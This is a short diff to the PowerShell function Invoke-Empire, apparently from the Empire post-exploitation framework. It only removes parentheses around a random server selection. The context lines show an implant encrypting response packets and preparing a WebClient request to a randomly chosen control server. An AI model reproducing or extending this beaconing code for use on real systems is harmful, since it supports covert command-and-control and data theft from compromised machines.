@@ -607,7 +607,7 @@ function Invoke-Empire {
         if($packets) {
             # build and encrypt the response packet
             $encBytes = Encrypt-Bytes $packets
-            $tempIndex = (Get-Random -maximum $Servers.count)
+            $tempIndex = Get-Random -maximum $Servers.count
             if($Servers[$tempIndex].StartsWith("http")){
                 # build the web request object
                 $wc = new-object system.net.WebClient
